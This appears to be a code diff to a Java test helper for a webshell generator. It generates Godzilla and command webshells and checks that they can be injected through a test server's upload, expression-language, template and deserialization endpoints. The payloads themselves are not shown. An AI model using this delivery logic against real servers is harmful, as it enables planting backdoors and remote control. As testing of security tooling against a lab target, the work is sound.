@@ -42,37 +42,38 @@ public class ShellAssertionTool {
                         .headerName("User-Agent").headerValue(headerValue)
                         .build();
                 log.info("generated {} godzilla with pass: {}, key: {}, headerValue: {}", shellType, pass, key, headerValue);
-                byte[] content = GeneratorMain.generate(shellConfig, injectorConfig, godzillaConfig, packer);
+                String content = GeneratorMain.generate(shellConfig, injectorConfig, godzillaConfig, packer);
                 assertInjectIsOk(url, shellType, shellTool, content, packer);
                 GodzillaShellTool.testIsOk(shellUrl, godzillaConfig);
                 break;
             case Command:
                 String paramName = "Command" + shellType + packer.name();
                 CommandConfig commandConfig = CommandConfig.builder().paramName(paramName).build();
-                byte[] commandContent = GeneratorMain.generate(shellConfig, injectorConfig, commandConfig, packer);
+                String commandContent = GeneratorMain.generate(shellConfig, injectorConfig, commandConfig, packer);
                 log.info("generated {} command shell with paramName: {}", shellType, commandConfig.getParamName());
                 assertInjectIsOk(url, shellType, shellTool, commandContent, packer);
                 CommandShellTool.testIsOk(shellUrl, commandConfig);
         }
     }
 
-    public static void assertInjectIsOk(String url, String shellType, ShellTool shellTool, byte[] content, Packer.INSTANCE packer) {
+    public static void assertInjectIsOk(String url, String shellType, ShellTool shellTool, String content, Packer.INSTANCE packer) {
+        log.info(content);
         switch (packer) {
             case JSP -> {
                 String uploadEntry = url + "/upload";
                 String filename = shellType + shellTool + ".jsp";
                 String shellUrl = url + "/" + filename;
-                VulTool.uploadJspFileToServer(uploadEntry, filename, new String(content));
+                VulTool.uploadJspFileToServer(uploadEntry, filename, content);
                 VulTool.urlIsOk(shellUrl);
             }
-            case ScriptEngine -> VulTool.postData(url + "/js", new String(content));
-            case EL -> VulTool.postData(url + "/el", new String(content));
-            case SpEL -> VulTool.postData(url + "/spel", new String(content));
-            case Ognl -> VulTool.postData(url + "/ognl", new String(content));
-            case Freemarker -> VulTool.postData(url + "/freemarker", new String(content));
-            case Velocity -> VulTool.postData(url + "/velocity", new String(content));
+            case ScriptEngine -> VulTool.postData(url + "/js", content);
+            case EL -> VulTool.postData(url + "/el", content);
+            case SpEL -> VulTool.postData(url + "/spel", content);
+            case OGNL -> VulTool.postData(url + "/ognl", content);
+            case Freemarker -> VulTool.postData(url + "/freemarker", content);
+            case Velocity -> VulTool.postData(url + "/velocity", content);
             case Deserialize ->
-                    VulTool.postData(url + "/java_deserialize", Base64.getEncoder().encodeToString(content));
+                    VulTool.postData(url + "/java_deserialize", content);
         }
     }
 }
